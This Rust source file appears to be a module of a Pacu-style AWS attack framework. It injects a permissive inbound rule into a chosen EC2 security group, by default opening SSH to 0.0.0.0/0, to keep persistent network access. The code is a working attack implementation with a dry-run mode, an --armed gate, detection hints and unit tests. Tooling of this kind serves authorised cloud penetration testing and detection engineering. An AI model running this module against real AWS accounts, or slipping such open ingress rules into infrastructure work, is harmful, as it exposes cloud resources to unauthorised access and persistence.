//! ec2__backdoor_ec2_sec_groups — inject permissive inbound rules into EC2 security groups.
//!
//! Category: PERSIST. Services: ["EC2"]. Requires --armed for write operations.
//!
//! Concept: An attacker with ec2:AuthorizeSecurityGroupIngress can open arbitrary
//! inbound ports on existing security groups, providing persistent network-level
//! access to resources protected by those groups.
//!
//! Args:
//!   --group-id <sg_id>   target security group (required)
//!   --cidr <cidr>        CIDR to allow (default: 0.0.0.0/0)
//!   --port <port>        port to open (default: 22)
//!   --protocol <proto>   protocol (default: tcp)
//!   --exploit            actually add the rule (requires --armed)
//!
//! Dry-run: print what would be called without touching AWS.
//!
//! Detection: AuthorizeSecurityGroupIngress with 0.0.0.0/0 —
//! CloudTrail + GuardDuty Recon:EC2/PortProbeUnprotectedPort

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

const DEFAULT_CIDR: &str = "0.0.0.0/0";
const DEFAULT_PORT: i32 = 22;
const DEFAULT_PROTOCOL: &str = "tcp";

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let group_id: &str = {
        let pos = args.iter().position(|&a| a == "--group-id");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(g) => g,
            None => anyhow::bail!("--group-id <sg_id> is required"),
        }
    };

    let cidr: &str = {
        let pos = args.iter().position(|&a| a == "--cidr");
        pos.and_then(|i| args.get(i + 1).copied())
            .unwrap_or(DEFAULT_CIDR)
    };

    let port: i32 = {
        let pos = args.iter().position(|&a| a == "--port");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(p) => p.parse::<i32>().context("--port must be a valid integer")?,
            None => DEFAULT_PORT,
        }
    };

    let protocol: &str = {
        let pos = args.iter().position(|&a| a == "--protocol");
        pos.and_then(|i| args.get(i + 1).copied())
            .unwrap_or(DEFAULT_PROTOCOL)
    };

    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    println!("{}", "ec2__backdoor_ec2_sec_groups".cyan().bold());
    println!(
        "  Detection: AuthorizeSecurityGroupIngress with 0.0.0.0/0 — \
         CloudTrail + GuardDuty Recon:EC2/PortProbeUnprotectedPort\n"
    );

    // ── Dry-run mode ───────────────────────────────────────────────────────
    if !exploit {
        println!(
            "  {} Would call: ec2:AuthorizeSecurityGroupIngress on {} to allow {}:{}/{}",
            "[DRY-RUN]".cyan(),
            group_id.yellow(),
            cidr.yellow(),
            port.to_string().yellow(),
            protocol.yellow()
        );
        println!(
            "\n{}",
            "Run with --exploit --armed to actually add the ingress rule.".yellow()
        );
        return Ok(());
    }

    // ── Armed + exploit ───────────────────────────────────────────────────
    println!(
        "  {} Calling ec2:AuthorizeSecurityGroupIngress on '{}'...",
        "[EXEC]".red().bold(),
        group_id.yellow()
    );

    let ec2 = aws_sdk_ec2::Client::new(&ctx.sdk_config);

    // Build IP permission
    let ip_range = aws_sdk_ec2::types::IpRange::builder()
        .cidr_ip(cidr)
        .description("lancer-pacu backdoor rule")
        .build();

    let ip_permission = aws_sdk_ec2::types::IpPermission::builder()
        .ip_protocol(protocol)
        .from_port(port)
        .to_port(port)
        .ip_ranges(ip_range)
        .build();

    ec2.authorize_security_group_ingress()
        .group_id(group_id)
        .ip_permissions(ip_permission)
        .send()
        .await
        .context("ec2:AuthorizeSecurityGroupIngress failed")?;

    println!(
        "  {} Ingress rule added to {}: {} port {}/{}",
        "[OK]".green().bold(),
        group_id.green(),
        cidr.green(),
        port.to_string().green(),
        protocol.green()
    );
    println!(
        "\n  GuardDuty Detection: Recon:EC2/PortProbeUnprotectedPort"
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "ec2__backdoor_ec2_sec_groups",
            author: "lancer-pacu",
            category: "PERSIST",
            one_liner: "Inject permissive inbound rules into EC2 security groups. Requires --armed + --exploit.",
            services: &["EC2"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "ec2__backdoor_ec2_sec_groups");
        assert!(found, "ec2__backdoor_ec2_sec_groups not found in inventory");
    }

    #[test]
    fn module_category_is_persist() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "ec2__backdoor_ec2_sec_groups")
            .expect("ec2__backdoor_ec2_sec_groups not found");
        assert_eq!(m.info.category, "PERSIST");
    }

    #[tokio::test]
    async fn missing_group_id_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // No --group-id provided
        let result = super::run(&ctx, &[]).await;
        assert!(result.is_err(), "expected error when --group-id is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--group-id"),
            "error should mention --group-id: {msg}"
        );
    }

    #[tokio::test]
    async fn dry_run_with_defaults_succeeds() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // Dry-run with only --group-id; no API call should happen
        let result = super::run(&ctx, &["--group-id", "sg-0123456789abcdef0"]).await;
        assert!(result.is_ok(), "dry-run should succeed: {:?}", result.err());
    }

    #[tokio::test]
    async fn invalid_port_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        let result = super::run(&ctx, &["--group-id", "sg-abc", "--port", "notanumber"]).await;
        assert!(result.is_err(), "expected error for non-numeric port");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--port") || msg.contains("integer") || msg.contains("invalid"),
            "error should be about port parsing: {msg}"
        );
    }
}
